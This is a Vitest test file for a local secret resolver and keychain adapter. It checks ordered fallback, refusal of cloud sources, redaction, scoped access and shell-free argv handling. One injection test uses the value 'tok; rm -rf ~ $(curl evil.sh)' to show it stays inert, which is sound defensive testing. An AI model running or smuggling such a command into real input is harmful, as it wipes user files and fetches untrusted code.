import { afterEach, describe, expect, it, vi } from "vitest";

import { clearSecretRegistryForTests, redactSecrets } from "@muse/shared";

import { resolveSecret } from "./resolve.js";
import { createSecretScope } from "./scope.js";
import { createEnvSource, envVarNameFor } from "./sources/env.js";
import { createKeychainSource, SECURITY_BIN, type ArgvRunner } from "./sources/keychain.js";
import { createStoreSource } from "./sources/store.js";
import type { SecretSource } from "./types.js";

afterEach(() => {
  clearSecretRegistryForTests();
});

describe("resolveSecret — ordered, read-on-demand, local-only", () => {
  it("returns the first hit and tries sources IN ORDER", async () => {
    const calls: string[] = [];
    const miss = (id: string): SecretSource => ({
      id,
      local: true,
      get: () => {
        calls.push(id);
        return Promise.resolve(undefined);
      }
    });
    const hit: SecretSource = {
      id: "hit",
      local: true,
      get: () => {
        calls.push("hit");
        return Promise.resolve("S3CR3T");
      }
    };
    const never: SecretSource = {
      id: "never",
      local: true,
      get: () => {
        calls.push("never");
        return Promise.resolve("other");
      }
    };
    const value = await resolveSecret({ name: "tok" }, [miss("a"), hit, never]);
    expect(value).toBe("S3CR3T");
    // Ordered fallback + short-circuit: "never" is never queried after a hit.
    expect(calls).toEqual(["a", "hit"]);
  });

  it("adapter miss ⇒ next source (ordered fallback, zero breakage)", async () => {
    const env = createEnvSource({}); // nothing set ⇒ miss
    const store = createStoreSource("store", () => Promise.resolve("legacy-value"));
    const value = await resolveSecret({ name: "calendar-token" }, [env, store]);
    expect(value).toBe("legacy-value");
  });

  it("REFUSES a non-local source — its get is NEVER called (no cloud egress)", async () => {
    const cloudGet = vi.fn(() => Promise.resolve("leaked-to-cloud"));
    const cloud: SecretSource = { id: "cloud-vault", local: false, get: cloudGet };
    const local = createStoreSource("store", () => Promise.resolve("local-value"));
    const value = await resolveSecret({ name: "tok" }, [cloud, local]);
    expect(cloudGet).not.toHaveBeenCalled();
    expect(value).toBe("local-value");
  });

  it("a value that only a non-local source holds resolves to undefined (refused, not fetched)", async () => {
    const cloudGet = vi.fn(() => Promise.resolve("leaked"));
    const cloud: SecretSource = { id: "cloud", local: false, get: cloudGet };
    expect(await resolveSecret({ name: "tok" }, [cloud])).toBeUndefined();
    expect(cloudGet).not.toHaveBeenCalled();
  });

  it("registers the resolved value so it is redacted afterward (no second plaintext copy beyond mask)", async () => {
    const store = createStoreSource("store", () => Promise.resolve("hunter2-very-secret"));
    await resolveSecret({ name: "gmail-pw" }, [store]);
    expect(redactSecrets("password is hunter2-very-secret done")).toBe(
      "password is ‹secret:gmail-pw› done"
    );
  });
});

describe("resolveSecret — no second plaintext copy (design §4.2)", () => {
  it("does not write the value to disk anywhere under a fresh dir", async () => {
    const { mkdtemp, readdir, rm } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const dir = await mkdtemp(join(tmpdir(), "muse-resolve-nodisk-"));
    try {
      const store = createStoreSource("store", () => Promise.resolve("on-demand-secret"));
      const value = await resolveSecret({ name: "tok" }, [createEnvSource({}), store]);
      expect(value).toBe("on-demand-secret");
      // The resolver reads on demand and returns a string; it must NOT cache or
      // persist a copy. The temp dir it could have written into stays empty.
      expect(await readdir(dir)).toEqual([]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe("createSecretScope — least-privilege, fail-closed", () => {
  it("an out-of-scope get returns undefined and never queries a source", async () => {
    const get = vi.fn(() => Promise.resolve("the-gmail-password"));
    const source: SecretSource = { id: "vault", local: true, get };
    const denied: string[] = [];
    const scope = createSecretScope(["telegram-token"], { onDenied: (ref) => denied.push(ref.name) });

    const value = await scope.get({ name: "gmail-password" }, [source]);
    expect(value).toBeUndefined();
    expect(get).not.toHaveBeenCalled();
    expect(denied).toEqual(["gmail-password"]);
  });

  it("an in-scope get resolves normally", async () => {
    const source = createStoreSource("vault", () => Promise.resolve("tg-secret"));
    const scope = createSecretScope(["telegram-token"]);
    expect(await scope.get({ name: "telegram-token" }, [source])).toBe("tg-secret");
    expect(scope.permits({ name: "telegram-token" })).toBe(true);
    expect(scope.permits({ name: "gmail-password" })).toBe(false);
  });

  it("a service-pinned scope entry fails closed across services (cross-service bypass closed)", async () => {
    const source = createStoreSource("vault", () => Promise.resolve("tg-secret"));
    const scope = createSecretScope([{ name: "token", service: "telegram" }]);
    expect(scope.permits({ name: "token", service: "telegram" })).toBe(true);
    expect(scope.permits({ name: "token", service: "gmail" })).toBe(false); // same name, other service → denied
    expect(scope.permits({ name: "token" })).toBe(false);                   // unqualified → denied
    expect(await scope.get({ name: "token", service: "gmail" }, [source])).toBeUndefined();
  });
});

describe("createEnvSource", () => {
  it("normalises the name to MUSE_SECRET_<NAME>", () => {
    expect(envVarNameFor("telegram-bot-token")).toBe("MUSE_SECRET_TELEGRAM_BOT_TOKEN");
  });
  it("reads the env var, missing ⇒ undefined", async () => {
    const src = createEnvSource({ MUSE_SECRET_TG: "abc" });
    expect(await src.get({ name: "tg" })).toBe("abc");
    expect(await src.get({ name: "absent" })).toBeUndefined();
    expect(src.local).toBe(true);
  });
});

describe("createKeychainSource — FIXED argv, never a shell string", () => {
  it("spawns /usr/bin/security with a literal argv ARRAY (no shell)", async () => {
    let capturedFile = "";
    let capturedArgs: readonly string[] = [];
    const runner: ArgvRunner = (file, args) => {
      capturedFile = file;
      capturedArgs = args;
      return Promise.resolve({ stdout: "kc-value\n" });
    };
    const src = createKeychainSource({ runner });
    const value = await src.get({ name: "telegram-token", service: "muse-msg" });

    expect(value).toBe("kc-value");
    expect(capturedFile).toBe(SECURITY_BIN);
    expect(Array.isArray(capturedArgs)).toBe(true);
    expect(capturedArgs).toEqual([
      "find-generic-password",
      "-w",
      "-s",
      "muse-msg",
      "-a",
      "telegram-token"
    ]);
  });

  it("a name with shell metacharacters is passed as ONE inert argv element (no injection)", async () => {
    const evil = "tok; rm -rf ~ $(curl evil.sh)";
    let capturedArgs: readonly string[] = [];
    const runner: ArgvRunner = (_file, args) => {
      capturedArgs = args;
      return Promise.resolve({ stdout: "" }); // empty ⇒ undefined
    };
    const src = createKeychainSource({ runner });
    await src.get({ name: evil });

    // The metachar string is exactly one argv element; it is never concatenated
    // into a command line, so no shell can interpret the `;` / `$()`.
    expect(capturedArgs).toContain(evil);
    expect(capturedArgs.at(-1)).toBe(evil);
    expect(capturedArgs.some((a) => a.includes(" rm -rf ") && a !== evil)).toBe(false);
  });

  it("a miss / locked vault (runner throws) ⇒ undefined, never a crash", async () => {
    const runner: ArgvRunner = () => Promise.reject(new Error("SecKeychainSearchCopyNext: item not found"));
    const src = createKeychainSource({ runner });
    await expect(src.get({ name: "absent" })).resolves.toBeUndefined();
  });
});
